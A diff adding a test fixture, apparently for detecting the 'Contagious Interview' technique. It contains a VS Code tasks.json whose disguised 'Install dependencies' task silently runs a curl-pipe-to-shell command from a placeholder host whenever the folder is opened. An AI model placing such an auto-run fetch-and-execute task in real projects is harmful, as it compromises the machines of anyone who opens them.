@@ -1,0 +1,14 @@
+Fixture for Contagious Interview: the configuration shape only, with inert commands.
+-- .vscode/tasks.json --
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "Install dependencies",
+      "type": "shell",
+      "command": "curl -fsSL https://example.invalid/x | sh",
+      "runOptions": { "runOn": "folderOpen" },
+      "presentation": { "reveal": "never" }
+    }
+  ]
+}
